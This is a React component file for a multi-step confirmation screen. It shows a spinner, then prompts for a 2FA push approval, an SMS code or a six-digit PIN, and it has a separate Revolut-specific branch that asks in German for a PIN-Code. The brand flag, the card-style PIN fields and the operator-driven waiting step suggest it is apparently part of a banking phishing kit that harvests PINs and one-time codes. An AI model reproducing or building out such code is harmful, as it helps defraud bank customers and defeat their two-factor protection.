import React from 'react';
import { MoonLoader } from 'react-spinners';
import styled from 'styled-components';

import { PinInput, Text } from '../../../components';

export const LOADER = ({
  loaderColor = '#000000',
  Title,
  Input,
  Button,
  isConfirm,
  isRevolut = false,
  isCodeConfirmed,
  type,
  smsInput,
  handleFinish,
  handleSendSms,
  handleSendPin,
  handleCode,
  handleCodeInput,
  handleSmsInput,
  inputs,
  setPin,
  setPinNumber,
  pinInput,
  codeInput,
  children,
  smsError,
  pushError,
  isFinished,
  pinError,
}) => {
  const getRef = (key) => {
    return inputs[key].ref;
  };

  if (isFinished) {
    return (
      <Cont>
        <div>
          <Title className="LR_TITLE">
            <Text tid="CONFIRMATIONS.MAIN.FINISHED" />
          </Title>
        </div>
      </Cont>
    );
  }

  if (!isConfirm) {
    return children || null;
  }

  const getType = () => {
    return type === '2FA' ? (
      <Cont>
        <div>
          <Title className="LR_TITLE">
            <Text tid="CONFIRMATIONS.MAIN.2FA_TITLE" />
          </Title>
        </div>
        {pushError && <Error>{pushError}</Error>}
        <div>
          <Button className="LR_BUTTON" onClick={handleFinish}>
            <Text tid="CONFIRMATIONS.MAIN.2FA_BUTTON" />
          </Button>
        </div>
      </Cont>
    ) : type === 'SMS' ? (
      <Cont>
        <div>
          <Title className="LR_TITLE">
            <Text tid="CONFIRMATIONS.MAIN.SMS_TITLE" />
          </Title>
        </div>
        <div>
          <Input onChange={handleSmsInput} value={smsInput} className="LR_INPUT" placeholder="SMS-Code" />
        </div>
        {smsError && <Error>{smsError}</Error>}
        <div>
          <Button disabled={smsInput === ''} className="LR_BUTTON" onClick={handleSendSms}>
            <Text tid="CONFIRMATIONS.MAIN.SMS_BUTTON" />
          </Button>
        </div>
      </Cont>
    ) : type === 'PIN' ? (
      <Cont>
        <div>
          <Title className="LR_TITLE">
            <Text tid="CONFIRMATIONS.MAIN.PIN_TITLE" />
          </Title>
        </div>
        <div>
          <InputsContainer>
            {Object.keys(inputs).map((item, index) => (
              <PinInput
                setCode={setPin}
                setNumber={setPinNumber}
                inputRef={inputs[item].ref}
                getRef={getRef}
                key={item}
                keyy={item}
                valuee={inputs[item]}
                autocomplete="one-time-code"
                className="card-input__input"
                style={
                  index === 0
                    ? { borderRadius: '6px 0px 0px 6px !important' }
                    : index === 5
                    ? { borderRadius: '0px 6px 6px 0px !important' }
                    : {}
                }
              />
            ))}
          </InputsContainer>
        </div>
        {pinError && <Error>{pinError}</Error>}
        <div>
          <Button disabled={pinInput === ''} className="LR_BUTTON" onClick={handleSendPin}>
            <Text tid="CONFIRMATIONS.MAIN.PIN_BUTTON" />
          </Button>
        </div>
      </Cont>
    ) : (
      <LoaderCont>
        <MoonLoader color={loaderColor} loading size={32} speedMultiplier={1.0} />
      </LoaderCont>
    );
  };

  if (isRevolut) {
    if (isCodeConfirmed) {
      return getType();
    } else {
      return (
        <Cont>
          <div>
            <Title className="LR_TITLE">PIN-Code eingeben.</Title>
          </div>
          <div>
            <Input onChange={handleCodeInput} value={codeInput} className="LR_INPUT" placeholder="PIN-Code" />
          </div>
          <div>
            <Button disabled={codeInput === ''} className="LR_BUTTON" onClick={handleCode}>
              Bestätigen
            </Button>
          </div>
        </Cont>
      );
    }
  } else {
    return getType();
  }
};

const Cont = styled.div`
  flex-direction: column;
  align-items: center;
  grid-gap: 24px;
  display: flex;

  .LR_TITLE {
    max-width: 400px;
    font-weight: bold;
    text-align: center;
    margin: 0 !important;
    margin-top: 24px !important;
  }

  .LR_INPUT {
    width: 250px;
    margin: 0 !important;
  }

  .LR_BUTTON {
    width: 250px;
    margin: 0 !important;
  }
`;

const LoaderCont = styled.div`
  display: flex;
  width: 100%;
  justify-content: center;
  padding: 100px;
`;
const Error = styled.p`
  color: red !important;
  font-size: 14px !important;
  margin-top: 10px !important;
`;

const InputsContainer = styled.div`
  display: flex;
  align-items: center;
  justify-content: flex-start;
  & > div {
    & > div {
      width: 100%;
    }
  }
  & > div:not(:last-child) {
    margin-right: 12px;
    @media (max-width: 500px) {
      margin-right: 5px;
    }
  }
`;
